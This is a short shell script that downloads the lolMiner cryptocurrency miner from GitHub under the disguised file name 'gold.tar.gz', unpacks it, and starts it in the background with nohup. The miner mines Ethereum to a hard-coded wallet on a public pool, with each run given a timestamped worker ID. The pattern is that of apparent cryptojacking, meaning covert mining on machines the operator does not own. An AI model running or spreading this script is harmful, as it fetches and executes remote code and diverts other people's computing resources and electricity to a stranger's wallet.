wget -O /home/user/gold.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
tar -xf /home/user/gold.tar.gz -C /home/user/
nohup ./1.31/lolMiner --algo ETHASH --pool us-eth.2miners.com:12020 --user 0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S ) --tls on --ethstratum ETHPROXY &
